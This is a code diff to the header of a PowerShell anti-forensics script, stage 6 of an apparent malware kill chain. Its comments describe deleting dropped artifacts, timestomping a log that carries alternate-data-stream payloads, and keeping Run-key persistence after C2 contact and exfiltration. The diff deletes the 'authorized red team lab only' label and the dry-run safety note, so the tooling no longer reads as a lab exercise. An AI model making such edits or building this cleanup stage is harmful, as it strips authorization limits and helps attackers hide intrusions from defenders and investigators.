@@ -1,11 +1,10 @@
-# cleanup.ps1 - TVeronica Stage 6: ANTI-FORENSICS (authorized red team lab only)
+# cleanup.ps1 - TVeronica Stage 6: ANTI-FORENSICS
 #
 # Trigger (per kill chain): persistence OK + C2 ACK + exfil OK - operator runs this last.
 #   1. delete %TEMP% staging artifacts (dropped scripts, logs, packages, probe markers)
 #   2. timestomp report.log (ADS carrier cover file)
 #   3. KEEP persistence (Run key + ADS payloads) unless -DropPersistence
 #
-# Lab: -DryRun previews every action without changing anything.
 
 param(
     [switch]$DropPersistence,
